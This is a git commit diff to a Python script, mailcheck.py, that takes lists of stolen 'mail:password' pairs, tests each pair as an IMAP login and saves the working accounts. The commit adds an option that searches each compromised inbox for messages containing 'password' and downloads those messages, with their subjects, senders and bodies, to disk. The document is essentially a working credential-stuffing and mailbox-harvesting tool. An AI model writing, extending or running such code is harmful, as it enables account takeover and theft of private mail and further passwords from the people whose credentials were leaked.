58f71f94a1ad96034856f6f931f0351b5ff2c756
Villalongue Maxime <maxime.villalongue@gmail.com>
2018-08-07 16:21:01 +0200

    Update mailcheck.py
    add --checkpassword option
    TODO : enhance

--- mailcheck.py
+++ mailcheck.py
@@ -1,16 +1,17 @@
 import click
 import imapclient
-import pyzmail
+import pyzmail,  pprint,os
 
 
 
 @click.option('--file' , prompt=True, help='Input fileName. Format : "mail:password"')
 @click.option('--server', prompt=True, help='IMAP server address')
 @click.option('--out', default='out.txt', help='Output fileName')
+@click.option('--checkpasswords', default='False', help='If True checks for password in this mailbox and retrieves mails')
 
 
 @click.command()
-def mailcheck(file, server, out):
+def mailcheck(file, server, out, checkpasswords):
     credentials = {}
     users = []
     good = {}
@@ -22,14 +23,20 @@ def mailcheck(file, server, out):
 
     for user in users:
         try:
-            print("")
-            print(user + " : " + credentials[user])
+            click.echo("")
+            click.echo(user + " : " + credentials[user])
             imapObj = imapclient.IMAPClient(server, ssl=True)
             imapObj.login(user, credentials[user])
             imapObj.select_folder('INBOX', readonly=True)
-            print("GOOD !!!" + user + " : " + credentials[user])
+            click.echo("GOOD !!!" + user + " : " + credentials[user])
             good[user] = credentials[user]
+            if checkpasswords == 'True':
+                UIDs = imapObj.search([u'TEXT', 'password'] )
 
+                if UIDs:
+                    downmails(user,imapObj,UIDs)
+
+            imapObj.logout()
 
         except imapclient.exceptions.LoginError:
             pass
@@ -42,6 +49,31 @@ def mailcheck(file, server, out):
 
         with open(out, 'a') as the_file:
             the_file.write(user+" : "+credentials[user]+"\n")
+
+
+def downmails(user,imapObj,UIDs):
+    newpath = r'.\\'+user
+    if not os.path.exists(newpath):
+        os.makedirs(newpath)
+
+    click.echo('Passwords present')
+    click.echo(UIDs)
+    l = len(UIDs)
+    rawmsg = imapObj.fetch(UIDs, ['BODY[]'])
+
+    for i in range(l):
+        msg = pyzmail.PyzMessage.factory(rawmsg[UIDs[i]]['BODY[]'])
+        subject = msg.get_subject()
+        fromaddr = msg.get_address('from')
+        body = str(msg.get_payload())
+
+        with open(newpath+'\\'+str(l)+'.html','a') as the_file1:
+            the_file1.write(body)
+        with open(newpath+'\\'+str(l)+'.txt','a') as the_file2:
+            the_file2.write('\nMessage ' + str(i + 1) + ': '+"\n")
+            the_file2.write('Subject: ' + subject.encode('utf-8')+"\n")
+            the_file2.write('From: ' + fromaddr[0].encode('utf-8') + ' <' + fromaddr[1].encode('utf-8') + '>'+"\n")
+            the_file2.write('Body:\n' + body.encode('utf-8')+"\n")
 
 if __name__ == '__main__':
     mailcheck()
